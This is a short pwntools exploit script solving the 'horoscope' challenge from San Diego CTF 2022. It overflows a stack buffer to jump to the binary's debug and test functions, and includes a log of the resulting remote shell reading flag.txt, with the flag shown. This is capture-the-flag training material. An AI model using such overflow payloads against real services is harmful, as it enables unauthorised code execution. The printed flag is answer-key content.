from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './horoscope'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "horoscope.sdc.tf"
  PORT = 1337
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

s.recvuntil("horoscope\n")

buf  = "01/01/2001/01/"
buf += "A"*42
buf += p64(elf.sym.debug)
buf += p64(elf.sym.test)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/San_Diego_CTF_2022/Pwn_Horoscope$ python solve.py r
[*] '/home/mito/CTF/San_Diego_CTF_2022/Pwn_Horoscope/horoscope'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to horoscope.sdc.tf on port 1337: Done
[*] Switching to interactive mode
please put in your birthday and time in the format (month/day/year/time) and we will have your very own horoscope
wow, you were born in the month of January. I think that means you will have a great week! :)$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ ls -l
total 16
-rw-r--r-- 1 nobody nogroup   42 Apr 29 18:41 flag.txt
-rwxr-xr-x 1 nobody nogroup 8808 May  5 21:58 horoscope
$ cat flag.txt
sdctf{S33ms_y0ur_h0rO5c0p3_W4s_g00d_1oD4y}
'''
